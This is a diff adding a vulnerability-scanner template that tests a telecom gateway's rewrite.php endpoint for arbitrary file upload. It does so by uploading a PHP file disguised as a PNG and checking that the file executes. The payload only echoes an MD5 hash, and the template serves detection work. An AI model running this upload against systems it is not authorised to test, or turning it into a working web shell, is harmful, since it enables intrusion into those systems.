@@ -1,0 +1,58 @@
+id: telecom-gateway-rewrite-php-anyfile-upload
+info:
+  name: Telecom Gateway rewrite.php Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template checks for an arbitrary file upload vulnerability in the telecom gateway configuration management system via the rewrite.php endpoint.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - id: file-upload
+    method: POST
+    path:
+      - "{{BaseURL}}/manager/teletext/material/rewrite.php"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT"
+    body: |-
+      ------WebKitFormBoundaryOKldnDPT
+      Content-Disposition: form-data; name="tmp_name"; filename="{{t1}}.php"
+      Content-Type: image/png
+
+      <?php echo md5({{t1}});?>
+      ------WebKitFormBoundaryOKldnDPT
+      Content-Disposition: form-data; name="uploadtime"
+
+
+      ------WebKitFormBoundaryOKldnDPT--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "success"
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
+
+  - id: file-verification
+    method: GET
+    path:
+      - "{{BaseURL}}/xmedia/material/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
